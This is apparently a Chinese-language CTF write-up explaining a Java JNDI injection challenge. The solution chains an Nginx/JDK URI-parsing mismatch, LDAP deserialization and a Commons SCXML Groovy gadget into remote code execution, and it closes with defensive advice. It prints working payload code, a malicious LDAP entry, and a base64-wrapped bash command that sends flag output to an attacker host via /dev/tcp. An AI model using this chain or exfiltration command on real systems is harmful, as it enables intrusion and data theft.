# Lookup

## 题目简述

题目是一个 Java 微服务，前端由 Nginx 代理，后端使用 JDK 自带的 `HttpServer`。后端在 `/lookup` 路径上把查询字符串直接交给 JNDI：

```java
var response = switch (req.getRequestURI().getPath()) {
    case "/lookup" -> {
        try {
            var param = req.getRequestURI().getQuery();
            yield new InitialContext().lookup(param).toString();
        } catch (Throwable e) {
            yield ":(";
        }
    }
    default -> "Not found";
};
```

Nginx 看似已经封死危险入口：

```nginx
location = /lookup  { deny all; }
location = /lookup/ { deny all; }

location / {
    proxy_pass http://localhost:8000;
}
```

容器中的 `/flag` 是一个直接输出 flag 的静态 ELF，权限为 `001`。运行 Web 服务的 `www-data` 用户只能执行它，不能把它当普通文件读取。因此最终命令必须执行 `/flag`，再将标准输出传出。

## 解题过程

### 路径解析差异

构造如下请求路径：

```text
//x/lookup?ldap://ATTACKER:9000/exp
```

Nginx 用于 location 匹配的路径不是精确的 `/lookup`，所以不会进入两个 `deny all` 规则。请求继续转发后，Java 将 `//x/lookup` 解析为一个带 authority 的 URI：authority 为 `x`，而 `getPath()` 的结果为 `/lookup`。于是同一个请求在后端命中了 JNDI 入口。

换言之，这里利用的是两层组件对请求目标的不同解释：

```text
Nginx：不是精确的 /lookup  -> 放行
JDK URI：path == /lookup    -> 执行 InitialContext.lookup
```

### 从 JNDI 到反序列化

查询字符串就是 JNDI 名称。让服务访问攻击者控制的 LDAP 服务，并在 LDAP 搜索响应中放入以下属性：

```java
Entry entry = new Entry(result.getRequest().getBaseDN());
entry.addAttribute("javaClassName", "");
entry.addAttribute("javaSerializedData", serializedPayload);
entry.addAttribute("javaCodeBase", "");
entry.addAttribute("objectClass", "javaNamingReference");
entry.addAttribute("javaFactory", "");
result.sendSearchEntry(entry);
```

题目镜像使用的旧版 JDK 17 构建仍会默认反序列化 LDAP 响应中的 `javaSerializedData`。这条链不依赖远程加载 class 文件，而是直接发送一个本地 classpath 中已有类型的 Java 序列化对象。

### Commons SCXML Groovy gadget

应用 classpath 中有构建自 Apache Commons SCXML 的 shaded JAR，其中 `GroovyExtendableScriptCache` 可序列化。调用 `getScript(source)` 后，脚本源码会进入 `scriptCache`；真正的已编译类是 transient 字段，不会随对象序列化。

该类的 `readObject` 会调用 `ensureInitializedOrReloaded()`：

```java
private void readObject(ObjectInputStream in)
        throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    ensureInitializedOrReloaded();
}
```

恢复对象时 `groovyClassLoader` 为空，`ensureInitializedOrReloaded()` 会遍历缓存的脚本源码并调用 `compileScript()`，最终到达：

```java
groovyClassLoader.parseClass(groovyCodeSource, false);
```

Groovy 的 `@ASTTest` 在编译阶段执行，因此可以把命令放进注解闭包：

```java
String groovy = String.format(
    "@groovy.transform.ASTTest(value={assert " +
    "java.lang.Runtime.getRuntime().exec(\"%s\")})\n" +
    "def x\n",
    command
);

GroovyExtendableScriptCache cache =
    new GroovyExtendableScriptCache();
cache.getScript(groovy);

ByteArrayOutputStream output = new ByteArrayOutputStream();
try (ObjectOutputStream stream = new ObjectOutputStream(output)) {
    stream.writeObject(cache);
}
byte[] serializedPayload = output.toByteArray();
```

这里调用一次 `getScript` 是为了把源码写入缓存。制作载荷的一侧也会编译一次，所以本地测试时应将命令换成无害内容；目标反序列化后会再次编译并执行。

### 回传 flag

由于 `/flag` 不可读但可执行，最终 shell 内容为：

```bash
/flag > /dev/tcp/ATTACKER/9003
```

官方 PoC 将它编码后交给 `bash -c`，避免 `Runtime.exec(String)` 的参数切分破坏重定向：

```java
String bashCommand = "/flag > /dev/tcp/ATTACKER/9003";
String encoded = Base64.getEncoder().encodeToString(
    bashCommand.getBytes(StandardCharsets.UTF_8)
);
String command =
    "bash -c {echo," + encoded + "}|{base64,-d}|{bash,-i}";
```

攻击端运行 LDAP 服务并监听 flag 回传端口，然后访问：

```text
https://TARGET//x/lookup?ldap://ATTACKER:9000/exp
```

在官方基础设施中，PoC 使用 `local` 作为赛题提供的攻击者回连主机名；自行复现时应替换为目标容器能够访问的地址。LDAP 收到查询后返回序列化对象，目标在反序列化阶段重新编译 Groovy 源码，执行 `/flag`，监听端即可收到实际 flag。

构建 PoC 所需的两个依赖均已放在题目 `solution` 目录：

```bash
javac -cp 'commons-scxml2-2.0-SNAPSHOT.jar:unboundid-ldapsdk-7.0.1.jar' Exp.java
java -cp '.:commons-scxml2-2.0-SNAPSHOT.jar:unboundid-ldapsdk-7.0.1.jar' Exp
```

## 方法总结

本题将三个问题串成一条利用链：反向代理和应用服务器的 URI 解析差异、JNDI LDAP 对序列化数据的信任，以及 Commons SCXML 中会在反序列化时重新编译 Groovy 脚本的 gadget。任何一环单独存在都未必能直接取 flag，组合后才形成远程代码执行。

防御上不能只在代理层用精确 location 黑名单保护危险接口。代理与后端应采用一致的 URI 规范化规则，规范化异常路径应直接拒绝；应用也不应把不可信字符串交给 `InitialContext.lookup`。同时应使用关闭 LDAP Java 对象反序列化的新版 JDK，并从 classpath 中移除不需要的脚本编译器和可序列化 gadget。
